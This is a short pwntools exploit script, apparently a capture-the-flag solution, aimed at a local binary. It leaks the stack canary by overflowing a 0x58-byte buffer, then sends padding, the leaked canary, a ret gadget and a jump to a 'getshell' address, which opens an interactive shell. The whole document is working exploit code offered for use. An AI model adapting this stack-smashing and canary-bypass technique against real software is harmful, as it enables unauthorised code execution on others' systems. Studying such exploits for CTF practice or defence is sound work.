# EXP
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *

context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/pwn")
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc 

gdb_script='''
b *0x40185C
'''

def dbg():
    gdb.attach(p,gdb_script)
    pause()

# dbg()
p.sendafter("Hello Hacker!\n",b'a'*(0x58+1))
p.recvuntil(b'a'*(0x58+1))
canary=u64(p.recv(7).rjust(8,b'\x00'))
print(hex(canary))
getshell=0x4017B5
ret=0x000000000040101a 
p.send(b'a'*0x58+p64(canary)+b'a'*8+p64(ret)+p64(getshell))

p.interactive()
```